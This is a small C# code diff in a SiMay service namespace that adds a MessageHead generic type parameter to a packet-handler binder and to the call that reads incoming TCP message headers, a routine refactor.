@@ -28,7 +28,7 @@ namespace SiMay.ServiceCore.ApplicationService
     {
         private ComputerInfo _memoryInfo = new ComputerInfo();
         private PerformanceCounter _cpuInfo = new PerformanceCounter("Processor", "% Processor Time", "_Total");
-        private PacketModelBinder<TcpSocketSaeaSession> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession>();
+        private PacketModelBinder<TcpSocketSaeaSession, MessageHead> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession, MessageHead>();
         public override void OnNotifyProc(TcpSocketCompletionNotify notify, TcpSocketSaeaSession session)
         {
             switch (notify)
@@ -40,7 +40,7 @@ namespace SiMay.ServiceCore.ApplicationService
                 case TcpSocketCompletionNotify.OnDataReceiveing:
                     break;
                 case TcpSocketCompletionNotify.OnDataReceived:
-                    this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead(), this);
+                    this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead<MessageHead>(), this);
                     break;
                 case TcpSocketCompletionNotify.OnClosed:
                     this._handlerBinder.Dispose();
